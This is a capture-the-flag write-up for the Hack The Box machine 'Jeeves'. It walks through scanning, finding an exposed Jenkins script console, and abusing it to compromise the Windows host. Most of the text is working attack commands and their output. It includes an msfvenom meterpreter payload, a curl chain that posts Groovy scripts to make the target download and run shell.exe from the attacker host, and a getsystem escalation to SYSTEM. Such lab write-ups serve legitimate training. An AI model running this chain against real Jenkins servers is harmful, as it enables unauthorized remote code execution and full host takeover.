# Target
| Category          | Details                                              |
|-------------------|------------------------------------------------------|
| 📝 **Name**       | [Jeeves](https://app.hackthebox.com/machines/Jeeves) |  
| 🏷 **Type**       | HTB Machine                                          |
| 🖥 **OS**         | Windows                                              |
| 🎯 **Difficulty** | Medium                                               |
| 📁 **Tags**       | Jenkins, Metasploit                                  |

# Scan
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-18T20:25:05
|_  start_date: 2025-11-18T20:17:03
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s
```

# Attack path
1. [Gain initial foothold by spawning reverse shell connection using Jenkins Groovy script console](#gain-initial-foothold-by-spawning-reverse-shell-connection-using-jenkins-groovy-script-console)
2. [Escalate to `Administrator` user using named pipe impersonation via Metasploit `getsystem`](#escalate-to-administrator-user-using-named-pipe-impersonation-via-metasploit-getsystem)

### Gain initial foothold by spawning reverse shell connection using Jenkins Groovy script console

#### Discover Jenkins running at `http://$TARGET:50000/askjeeves`
```
┌──(magicrc㉿perun)-[~/attack/HTB Jeeves]
└─$ feroxbuster --url http://$TARGET:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<SNIP>
302      GET        0l        0w        0c http://10.129.123.133:50000/askjeeves => http://10.129.123.133:50000/askjeeves/
<SNIP>
```

#### Generate and host `windows/x64/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Jeeves]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe && \
python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Jeeves]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.54:4444
```

#### Execute Groovy script to download and execute reverse shell 
```
┌──(magicrc㉿perun)-[~/attack/HTB Jeeves]
└─$ JENKINS_CRUMB=$(curl -s http://$TARGET:50000/askjeeves/script | grep -oP '(?<=crumb.init\("Jenkins-Crumb", ")[^"]+') && \
DOWNLOAD_REVERSE_SHELL=$(echo "[\"powershell\", \"-Command\", \"wget $LHOST/shell.exe -OutFile shell.exe\"].execute()" | jq -sRr @uri) && \
EXECUTE_REVERSE_SHELL=$(echo '"cmd /c shell.exe".execute()' | jq -sRr @uri) && \
curl -s http://$TARGET:50000/askjeeves/script -d "script=$DOWNLOAD_REVERSE_SHELL&Jenkins-Crumb=$JENKINS_CRUMB" -o /dev/null && \
sleep 2 && \
curl -s http://$TARGET:50000/askjeeves/script -d "script=$EXECUTE_REVERSE_SHELL&Jenkins-Crumb=$JENKINS_CRUMB" -o /dev/null
```

#### Confirm foothold gained
```
[*] Sending stage (230982 bytes) to 10.129.123.133
[*] Meterpreter session 1 opened (10.10.16.54:4444 -> 10.129.123.133:49681) at 2025-11-18 21:43:20 +0100

meterpreter > getuid
Server username: JEEVES\kohsuke
```

### Escalate to `Administrator` user using named pipe impersonation via Metasploit `getsystem`

#### Execute `getsystem`
```
meterpreter > getsystem 
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
